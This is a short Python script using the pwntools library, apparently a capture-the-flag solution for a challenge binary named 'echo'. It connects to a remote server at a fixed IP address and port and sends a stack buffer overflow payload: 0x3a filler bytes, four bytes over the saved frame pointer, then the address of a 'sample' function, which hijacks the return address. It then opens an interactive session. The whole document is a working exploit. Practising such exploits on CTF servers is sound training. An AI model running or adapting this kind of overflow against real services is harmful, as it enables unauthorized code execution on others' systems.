from pwn import *
# context.log_level = "debug"
p = remote("111.198.29.45" , 30576)
# p = process("./echo")
elf = ELF("./echo")
# gdb.attach(p , "b *0x080485ED")
payload = "a" * 0x3a + "b" * 4 + p32(elf.sym["sample"])
p.sendline(payload)

p.interactive()